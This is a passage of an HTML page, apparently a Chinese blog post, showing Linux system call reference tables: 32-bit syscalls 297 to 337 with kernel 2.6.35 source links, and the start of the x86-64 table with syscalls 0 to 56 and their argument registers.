<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/mknodat.2.html" target="_blank" rel="external">sys_mknodat</a></td>
<td>0x129</td>
<td>int dfd</td>
<td>const char __user * filename</td>
<td>int mode</td>
<td>unsigned dev</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/fs/namei.c?v=2.6.35#L2012" target="_blank" rel="external">fs/namei.c:2012</a></td>
</tr>
<tr>
<td>298</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/fchownat.2.html" target="_blank" rel="external">sys_fchownat</a></td>
<td>0x12a</td>
<td>int dfd</td>
<td>const char __user *filename</td>
<td>uid_t user</td>
<td>gid_t group</td>
<td>int flag</td>
<td><a href="http://lxr.free-electrons.com/source/fs/open.c?v=2.6.35#L558" target="_blank" rel="external">fs/open.c:558</a></td>
</tr>
<tr>
<td>299</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/futimesat.2.html" target="_blank" rel="external">sys_futimesat</a></td>
<td>0x12b</td>
<td>int dfd</td>
<td>char __user *filename</td>
<td><a href="http://lxr.free-electrons.com/source/include/linux/time.h?v=2.6.35#L20" target="_blank" rel="external">struct timeval __user *utimes</a></td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/fs/utimes.c?v=2.6.35#L191" target="_blank" rel="external">fs/utimes.c:191</a></td>
</tr>
<tr>
<td>300</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/fstatat64.2.html" target="_blank" rel="external">sys_fstatat64</a></td>
<td>0x12c</td>
<td>int dfd</td>
<td>char __user *filename</td>
<td><a href="http://lxr.free-electrons.com/source/arch/alpha/include/asm/stat.h?v=2.6.35#L25" target="_blank" rel="external">struct stat64 __user *statbuf</a></td>
<td>int flag</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/fs/stat.c?v=2.6.35#L391" target="_blank" rel="external">fs/stat.c:391</a></td>
</tr>
<tr>
<td>301</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/unlinkat.2.html" target="_blank" rel="external">sys_unlinkat</a></td>
<td>0x12d</td>
<td>int dfd</td>
<td>const char __user * pathname</td>
<td>int flag</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/fs/namei.c?v=2.6.35#L2341" target="_blank" rel="external">fs/namei.c:2341</a></td>
</tr>
<tr>
<td>302</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/renameat.2.html" target="_blank" rel="external">sys_renameat</a></td>
<td>0x12e</td>
<td>int olddfd</td>
<td>const char __user * oldname</td>
<td>int newdfd</td>
<td>const char __user * newname</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/fs/namei.c?v=2.6.35#L2671" target="_blank" rel="external">fs/namei.c:2671</a></td>
</tr>
<tr>
<td>303</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/linkat.2.html" target="_blank" rel="external">sys_linkat</a></td>
<td>0x12f</td>
<td>int olddfd</td>
<td>const char __user *oldname</td>
<td>int newdfd</td>
<td>const char __user *newname</td>
<td>int flags</td>
<td><a href="http://lxr.free-electrons.com/source/fs/namei.c?v=2.6.35#L2470" target="_blank" rel="external">fs/namei.c:2470</a></td>
</tr>
<tr>
<td>304</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/symlinkat.2.html" target="_blank" rel="external">sys_symlinkat</a></td>
<td>0x130</td>
<td>const char __user * oldname</td>
<td>int newdfd</td>
<td>const char __user * newname</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/fs/namei.c?v=2.6.35#L2377" target="_blank" rel="external">fs/namei.c:2377</a></td>
</tr>
<tr>
<td>305</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/readlinkat.2.html" target="_blank" rel="external">sys_readlinkat</a></td>
<td>0x131</td>
<td>int dfd</td>
<td>const char __user *path</td>
<td>char __user *buf</td>
<td>int bufsiz</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/fs/stat.c?v=2.6.35#L284" target="_blank" rel="external">fs/stat.c:284</a></td>
</tr>
<tr>
<td>306</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/fchmodat.2.html" target="_blank" rel="external">sys_fchmodat</a></td>
<td>0x132</td>
<td>int dfd</td>
<td>const char __user * filename</td>
<td>mode_t mode</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/fs/open.c?v=2.6.35#L474" target="_blank" rel="external">fs/open.c:474</a></td>
</tr>
<tr>
<td>307</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/faccessat.2.html" target="_blank" rel="external">sys_faccessat</a></td>
<td>0x133</td>
<td>int dfd</td>
<td>const char __user *filename</td>
<td>int mode</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/fs/open.c?v=2.6.35#L286" target="_blank" rel="external">fs/open.c:286</a></td>
</tr>
<tr>
<td>308</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/pselect6.2.html" target="_blank" rel="external">sys_pselect6</a></td>
<td>0x134</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/fs/select.c?v=2.6.35#L675" target="_blank" rel="external">fs/select.c:675</a></td>
</tr>
<tr>
<td>309</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/ppoll.2.html" target="_blank" rel="external">sys_ppoll</a></td>
<td>0x135</td>
<td><a href="http://lxr.free-electrons.com/source/include/asm-generic/poll.h?v=2.6.35#L31" target="_blank" rel="external">struct pollfd __user *ufds</a></td>
<td>unsigned int nfds</td>
<td><a href="http://lxr.free-electrons.com/source/include/linux/coda.h?v=2.6.35#L116" target="_blank" rel="external">struct timespec __user *tsp</a></td>
<td>const sigset_t __user *sigmask</td>
<td>size_t sigsetsize</td>
<td><a href="http://lxr.free-electrons.com/source/fs/select.c?v=2.6.35#L950" target="_blank" rel="external">fs/select.c:950</a></td>
</tr>
<tr>
<td>310</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/unshare.2.html" target="_blank" rel="external">sys_unshare</a></td>
<td>0x136</td>
<td>unsigned long unshare_flags</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/kernel/fork.c?v=2.6.35#L1624" target="_blank" rel="external">kernel/fork.c:1624</a></td>
</tr>
<tr>
<td>311</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/set_robust_list.2.html" target="_blank" rel="external">sys_set_robust_list</a></td>
<td>0x137</td>
<td><a href="http://lxr.free-electrons.com/source/include/linux/futex.h?v=2.6.35#L69" target="_blank" rel="external">struct robust_list_head __user *head</a></td>
<td>size_t len</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/kernel/futex.c?v=2.6.35#L2351" target="_blank" rel="external">kernel/futex.c:2351</a></td>
</tr>
<tr>
<td>312</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/get_robust_list.2.html" target="_blank" rel="external">sys_get_robust_list</a></td>
<td>0x138</td>
<td>int pid</td>
<td><a href="http://lxr.free-electrons.com/source/include/linux/futex.h?v=2.6.35#L69" target="_blank" rel="external">struct robust_list_head <strong>user * </strong>user *head_ptr</a></td>
<td>size_t __user *len_ptr</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/kernel/futex.c?v=2.6.35#L2373" target="_blank" rel="external">kernel/futex.c:2373</a></td>
</tr>
<tr>
<td>313</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/splice.2.html" target="_blank" rel="external">sys_splice</a></td>
<td>0x139</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/fs/splice.c?v=2.6.35#L1718" target="_blank" rel="external">fs/splice.c:1718</a></td>
</tr>
<tr>
<td>314</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/sync_file_range.2.html" target="_blank" rel="external">sys_sync_file_range</a></td>
<td>0x13a</td>
<td>int fd</td>
<td>loff_t offset</td>
<td>loff_t nbytes</td>
<td>unsigned int flags</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/not%20found?v=2.6.35#L" target="_blank" rel="external">not found:</a></td>
</tr>
<tr>
<td>315</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/tee.2.html" target="_blank" rel="external">sys_tee</a></td>
<td>0x13b</td>
<td>int fdin</td>
<td>int fdout</td>
<td>size_t len</td>
<td>unsigned int flags</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/fs/splice.c?v=2.6.35#L2061" target="_blank" rel="external">fs/splice.c:2061</a></td>
</tr>
<tr>
<td>316</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/vmsplice.2.html" target="_blank" rel="external">sys_vmsplice</a></td>
<td>0x13c</td>
<td>int fd</td>
<td>const struct iovec __user *iov</td>
<td>unsigned long nr_segs</td>
<td>unsigned int flags</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/fs/splice.c?v=2.6.35#L1692" target="_blank" rel="external">fs/splice.c:1692</a></td>
</tr>
<tr>
<td>317</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/move_pages.2.html" target="_blank" rel="external">sys_move_pages</a></td>
<td>0x13d</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/mm/migrate.c?v=2.6.35#L1075" target="_blank" rel="external">mm/migrate.c:1075</a></td>
</tr>
<tr>
<td>318</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/getcpu.2.html" target="_blank" rel="external">sys_getcpu</a></td>
<td>0x13e</td>
<td>unsigned __user *cpu</td>
<td>unsigned __user *node</td>
<td><a href="http://lxr.free-electrons.com/source/include/linux/getcpu.h?v=2.6.35#L14" target="_blank" rel="external">struct getcpu_cache __user *cache</a></td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/kernel/sys.c?v=2.6.35#L1621" target="_blank" rel="external">kernel/sys.c:1621</a></td>
</tr>
<tr>
<td>319</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/epoll_pwait.2.html" target="_blank" rel="external">sys_epoll_pwait</a></td>
<td>0x13f</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/fs/eventpoll.c?v=2.6.35#L1373" target="_blank" rel="external">fs/eventpoll.c:1373</a></td>
</tr>
<tr>
<td>320</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/utimensat.2.html" target="_blank" rel="external">sys_utimensat</a></td>
<td>0x140</td>
<td>int dfd</td>
<td>char __user *filename</td>
<td><a href="http://lxr.free-electrons.com/source/include/linux/coda.h?v=2.6.35#L116" target="_blank" rel="external">struct timespec __user *utimes</a></td>
<td>int flags</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/fs/utimes.c?v=2.6.35#L173" target="_blank" rel="external">fs/utimes.c:173</a></td>
</tr>
<tr>
<td>321</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/signalfd.2.html" target="_blank" rel="external">sys_signalfd</a></td>
<td>0x141</td>
<td>int ufd</td>
<td>sigset_t __user *user_mask</td>
<td>size_t sizemask</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/fs/signalfd.c?v=2.6.35#L265" target="_blank" rel="external">fs/signalfd.c:265</a></td>
</tr>
<tr>
<td>322</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/timerfd_create.2.html" target="_blank" rel="external">sys_timerfd_create</a></td>
<td>0x142</td>
<td>int clockid</td>
<td>int flags</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/fs/timerfd.c?v=2.6.35#L164" target="_blank" rel="external">fs/timerfd.c:164</a></td>
</tr>
<tr>
<td>323</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/eventfd.2.html" target="_blank" rel="external">sys_eventfd</a></td>
<td>0x143</td>
<td>unsigned int count</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/fs/eventfd.c?v=2.6.35#L434" target="_blank" rel="external">fs/eventfd.c:434</a></td>
</tr>
<tr>
<td>324</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/fallocate.2.html" target="_blank" rel="external">sys_fallocate</a></td>
<td>0x144</td>
<td>int fd</td>
<td>int mode</td>
<td>loff_t offset</td>
<td>loff_t len</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/not%20found?v=2.6.35#L" target="_blank" rel="external">not found:</a></td>
</tr>
<tr>
<td>325</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/timerfd_settime.2.html" target="_blank" rel="external">sys_timerfd_settime</a></td>
<td>0x145</td>
<td>int ufd</td>
<td>int flags</td>
<td><a href="http://lxr.free-electrons.com/source/include/linux/time.h?v=2.6.35#L258" target="_blank" rel="external">const struct itimerspec __user *utmr</a></td>
<td><a href="http://lxr.free-electrons.com/source/include/linux/time.h?v=2.6.35#L258" target="_blank" rel="external">struct itimerspec __user *otmr</a></td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/fs/timerfd.c?v=2.6.35#L194" target="_blank" rel="external">fs/timerfd.c:194</a></td>
</tr>
<tr>
<td>326</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/timerfd_gettime.2.html" target="_blank" rel="external">sys_timerfd_gettime</a></td>
<td>0x146</td>
<td>int ufd</td>
<td><a href="http://lxr.free-electrons.com/source/include/linux/time.h?v=2.6.35#L258" target="_blank" rel="external">struct itimerspec __user *otmr</a></td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/fs/timerfd.c?v=2.6.35#L252" target="_blank" rel="external">fs/timerfd.c:252</a></td>
</tr>
<tr>
<td>327</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/signalfd4.2.html" target="_blank" rel="external">sys_signalfd4</a></td>
<td>0x147</td>
<td>int ufd</td>
<td>sigset_t __user *user_mask</td>
<td>size_t sizemask</td>
<td>int flags</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/fs/signalfd.c?v=2.6.35#L211" target="_blank" rel="external">fs/signalfd.c:211</a></td>
</tr>
<tr>
<td>328</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/eventfd2.2.html" target="_blank" rel="external">sys_eventfd2</a></td>
<td>0x148</td>
<td>unsigned int count</td>
<td>int flags</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/fs/eventfd.c?v=2.6.35#L409" target="_blank" rel="external">fs/eventfd.c:409</a></td>
</tr>
<tr>
<td>329</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/epoll_create1.2.html" target="_blank" rel="external">sys_epoll_create1</a></td>
<td>0x149</td>
<td>int flags</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/fs/eventpoll.c?v=2.6.35#L1187" target="_blank" rel="external">fs/eventpoll.c:1187</a></td>
</tr>
<tr>
<td>330</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/dup3.2.html" target="_blank" rel="external">sys_dup3</a></td>
<td>0x14a</td>
<td>unsigned int oldfd</td>
<td>unsigned int newfd</td>
<td>int flags</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/fs/fcntl.c?v=2.6.35#L53" target="_blank" rel="external">fs/fcntl.c:53</a></td>
</tr>
<tr>
<td>331</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/pipe2.2.html" target="_blank" rel="external">sys_pipe2</a></td>
<td>0x14b</td>
<td>int __user *fildes</td>
<td>int flags</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/fs/pipe.c?v=2.6.35#L1101" target="_blank" rel="external">fs/pipe.c:1101</a></td>
</tr>
<tr>
<td>332</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/inotify_init1.2.html" target="_blank" rel="external">sys_inotify_init1</a></td>
<td>0x14c</td>
<td>int flags</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/fs/notify/inotify/inotify_user.c?v=2.6.35#L640" target="_blank" rel="external">fs/notify/inotify/inotify_user.c:640</a></td>
</tr>
<tr>
<td>333</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/preadv.2.html" target="_blank" rel="external">sys_preadv</a></td>
<td>0x14d</td>
<td>unsigned long fd</td>
<td>const struct iovec __user *vec</td>
<td>unsigned long vlen</td>
<td>unsigned long pos_l</td>
<td>unsigned long pos_h</td>
<td><a href="http://lxr.free-electrons.com/source/fs/read_write.c?v=2.6.35#L759" target="_blank" rel="external">fs/read_write.c:759</a></td>
</tr>
<tr>
<td>334</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/pwritev.2.html" target="_blank" rel="external">sys_pwritev</a></td>
<td>0x14e</td>
<td>unsigned long fd</td>
<td>const struct iovec __user *vec</td>
<td>unsigned long vlen</td>
<td>unsigned long pos_l</td>
<td>unsigned long pos_h</td>
<td><a href="http://lxr.free-electrons.com/source/fs/read_write.c?v=2.6.35#L784" target="_blank" rel="external">fs/read_write.c:784</a></td>
</tr>
<tr>
<td>335</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/rt_tgsigqueueinfo.2.html" target="_blank" rel="external">sys_rt_tgsigqueueinfo</a></td>
<td>0x14f</td>
<td>pid_t tgid</td>
<td>pid_t pid</td>
<td>int sig</td>
<td>siginfo_t __user *uinfo</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/kernel/signal.c?v=2.6.35#L2437" target="_blank" rel="external">kernel/signal.c:2437</a></td>
</tr>
<tr>
<td>336</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/perf_event_open.2.html" target="_blank" rel="external">sys_perf_event_open</a></td>
<td>0x150</td>
<td><a href="http://lxr.free-electrons.com/source/include/linux/perf_event.h?v=2.6.35#L166" target="_blank" rel="external">struct perf_event_attr __user *attr_uptr</a></td>
<td>pid_t pid</td>
<td>int cpu</td>
<td>int group_fd</td>
<td>unsigned long flags</td>
<td><a href="http://lxr.free-electrons.com/source/kernel/perf_event.c?v=2.6.35#L5065" target="_blank" rel="external">kernel/perf_event.c:5065</a></td>
</tr>
<tr>
<td>337</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/recvmmsg.2.html" target="_blank" rel="external">sys_recvmmsg</a></td>
<td>0x151</td>
<td>int fd</td>
<td><a href="http://lxr.free-electrons.com/source/include/linux/socket.h?v=2.6.35#L72" target="_blank" rel="external">struct mmsghdr __user *msg</a></td>
<td>unsigned int vlen</td>
<td>unsigned flags</td>
<td><a href="http://lxr.free-electrons.com/source/include/linux/coda.h?v=2.6.35#L116" target="_blank" rel="external">struct timespec __user *timeout</a></td>
<td><a href="http://lxr.free-electrons.com/source/net/socket.c?v=2.6.35#L2168" target="_blank" rel="external">net/socket.c:2168</a></td>
</tr>
</tbody>
</table>
<h4 id="4-2-64系统调用表"><a href="#4-2-64系统调用表" class="headerlink" title="4.2 64系统调用表"></a>4.2 64系统调用表</h4><table>
<thead>
<tr>
<th>%rax</th>
<th>System call</th>
<th>%rdi</th>
<th>%rsi</th>
<th>%rdx</th>
<th>%r10</th>
<th>%r8</th>
<th>%r9</th>
</tr>
</thead>
<tbody>
<tr>
<td>0</td>
<td>sys_read</td>
<td>unsigned int fd</td>
<td>char *buf</td>
<td>size_t count</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>1</td>
<td>sys_write</td>
<td>unsigned int fd</td>
<td>const char *buf</td>
<td>size_t count</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>2</td>
<td>sys_open</td>
<td>const char *filename</td>
<td>int flags</td>
<td>int mode</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>3</td>
<td>sys_close</td>
<td>unsigned int fd</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>4</td>
<td>sys_stat</td>
<td>const char *filename</td>
<td>struct stat *statbuf</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>5</td>
<td>sys_fstat</td>
<td>unsigned int fd</td>
<td>struct stat *statbuf</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>6</td>
<td>sys_lstat</td>
<td>fconst char *filename</td>
<td>struct stat *statbuf</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>7</td>
<td>sys_poll</td>
<td>struct poll_fd *ufds</td>
<td>unsigned int nfds</td>
<td>long timeout_msecs</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>8</td>
<td>sys_lseek</td>
<td>unsigned int fd</td>
<td>off_t offset</td>
<td>unsigned int origin</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>9</td>
<td>sys_mmap</td>
<td>unsigned long addr</td>
<td>unsigned long len</td>
<td>unsigned long prot</td>
<td>unsigned long flags</td>
<td>unsigned long fd</td>
<td>unsigned long off</td>
</tr>
<tr>
<td>10</td>
<td>sys_mprotect</td>
<td>unsigned long start</td>
<td>size_t len</td>
<td>unsigned long prot</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>11</td>
<td>sys_munmap</td>
<td>unsigned long addr</td>
<td>size_t len</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>12</td>
<td>sys_brk</td>
<td>unsigned long brk</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>13</td>
<td>sys_rt_sigaction</td>
<td>int sig</td>
<td>const struct sigaction *act</td>
<td>struct sigaction *oact</td>
<td>size_t sigsetsize</td>
<td></td>
<td></td>
</tr>
<tr>
<td>14</td>
<td>sys_rt_sigprocmask</td>
<td>int how</td>
<td>sigset_t *nset</td>
<td>sigset_t *oset</td>
<td>size_t sigsetsize</td>
<td></td>
<td></td>
</tr>
<tr>
<td>15</td>
<td>sys_rt_sigreturn</td>
<td>unsigned long __unused</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>16</td>
<td>sys_ioctl</td>
<td>unsigned int fd</td>
<td>unsigned int cmd</td>
<td>unsigned long arg</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>17</td>
<td>sys_pread64</td>
<td>unsigned long fd</td>
<td>char *buf</td>
<td>size_t count</td>
<td>loff_t pos</td>
<td></td>
<td></td>
</tr>
<tr>
<td>18</td>
<td>sys_pwrite64</td>
<td>unsigned int fd</td>
<td>const char *buf</td>
<td>size_t count</td>
<td>loff_t pos</td>
<td></td>
<td></td>
</tr>
<tr>
<td>19</td>
<td>sys_readv</td>
<td>unsigned long fd</td>
<td>const struct iovec *vec</td>
<td>unsigned long vlen</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>20</td>
<td>sys_writev</td>
<td>unsigned long fd</td>
<td>const struct iovec *vec</td>
<td>unsigned long vlen</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>21</td>
<td>sys_access</td>
<td>const char *filename</td>
<td>int mode</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>22</td>
<td>sys_pipe</td>
<td>int *filedes</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>23</td>
<td>sys_select</td>
<td>int n</td>
<td>fd_set *inp</td>
<td>fd_set *outp</td>
<td>fd_set*exp</td>
<td>struct timeval *tvp</td>
<td></td>
</tr>
<tr>
<td>24</td>
<td>sys_sched_yield</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>25</td>
<td>sys_mremap</td>
<td>unsigned long addr</td>
<td>unsigned long old_len</td>
<td>unsigned long new_len</td>
<td>unsigned long flags</td>
<td>unsigned long new_addr</td>
<td></td>
</tr>
<tr>
<td>26</td>
<td>sys_msync</td>
<td>unsigned long start</td>
<td>size_t len</td>
<td>int flags</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>27</td>
<td>sys_mincore</td>
<td>unsigned long start</td>
<td>size_t len</td>
<td>unsigned char *vec</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>28</td>
<td>sys_madvise</td>
<td>unsigned long start</td>
<td>size_t len_in</td>
<td>int behavior</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>29</td>
<td>sys_shmget</td>
<td>key_t key</td>
<td>size_t size</td>
<td>int shmflg</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>30</td>
<td>sys_shmat</td>
<td>int shmid</td>
<td>char *shmaddr</td>
<td>int shmflg</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>31</td>
<td>sys_shmctl</td>
<td>int shmid</td>
<td>int cmd</td>
<td>struct shmid_ds *buf</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>32</td>
<td>sys_dup</td>
<td>unsigned int fildes</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>33</td>
<td>sys_dup2</td>
<td>unsigned int oldfd</td>
<td>unsigned int newfd</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>34</td>
<td>sys_pause</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>35</td>
<td>sys_nanosleep</td>
<td>struct timespec *rqtp</td>
<td>struct timespec *rmtp</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>36</td>
<td>sys_getitimer</td>
<td>int which</td>
<td>struct itimerval *value</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>37</td>
<td>sys_alarm</td>
<td>unsigned int seconds</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>38</td>
<td>sys_setitimer</td>
<td>int which</td>
<td>struct itimerval *value</td>
<td>struct itimerval *ovalue</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>39</td>
<td>sys_getpid</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>40</td>
<td>sys_sendfile</td>
<td>int out_fd</td>
<td>int in_fd</td>
<td>off_t *offset</td>
<td>size_t count</td>
<td></td>
<td></td>
</tr>
<tr>
<td>41</td>
<td>sys_socket</td>
<td>int family</td>
<td>int type</td>
<td>int protocol</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>42</td>
<td>sys_connect</td>
<td>int fd</td>
<td>struct sockaddr *uservaddr</td>
<td>int addrlen</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>43</td>
<td>sys_accept</td>
<td>int fd</td>
<td>struct sockaddr *upeer_sockaddr</td>
<td>int *upeer_addrlen</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>44</td>
<td>sys_sendto</td>
<td>int fd</td>
<td>void *buff</td>
<td>size_t len</td>
<td>unsigned flags</td>
<td>struct sockaddr *addr</td>
<td>int addr_len</td>
</tr>
<tr>
<td>45</td>
<td>sys_recvfrom</td>
<td>int fd</td>
<td>void *ubuf</td>
<td>size_t size</td>
<td>unsigned flags</td>
<td>struct sockaddr *addr</td>
<td>int *addr_len</td>
</tr>
<tr>
<td>46</td>
<td>sys_sendmsg</td>
<td>int fd</td>
<td>struct msghdr *msg</td>
<td>unsigned flags</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>47</td>
<td>sys_recvmsg</td>
<td>int fd</td>
<td>struct msghdr *msg</td>
<td>unsigned int flags</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>48</td>
<td>sys_shutdown</td>
<td>int fd</td>
<td>int how</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>49</td>
<td>sys_bind</td>
<td>int fd</td>
<td>struct sokaddr *umyaddr</td>
<td>int addrlen</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>50</td>
<td>sys_listen</td>
<td>int fd</td>
<td>int backlog</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>51</td>
<td>sys_getsockname</td>
<td>int fd</td>
<td>struct sockaddr *usockaddr</td>
<td>int *usockaddr_len</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>52</td>
<td>sys_getpeername</td>
<td>int fd</td>
<td>struct sockaddr *usockaddr</td>
<td>int *usockaddr_len</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>53</td>
<td>sys_socketpair</td>
<td>int family</td>
<td>int type</td>
<td>int protocol</td>
<td>int *usockvec</td>
<td></td>
<td></td>
</tr>
<tr>
<td>54</td>
<td>sys_setsockopt</td>
<td>int fd</td>
<td>int level</td>
<td>int optname</td>
<td>char *optval</td>
<td>int optlen</td>
<td></td>
</tr>
<tr>
<td>55</td>
<td>sys_getsockopt</td>
<td>int fd</td>
<td>int level</td>
<td>int optname</td>
<td>char *optval</td>
<td>int *optlen</td>
<td></td>
</tr>
<tr>
<td>56</td>
<td>sys_clone</td>
<td>unsigned long clone_flags</td>
<td>unsigned long newsp</td>
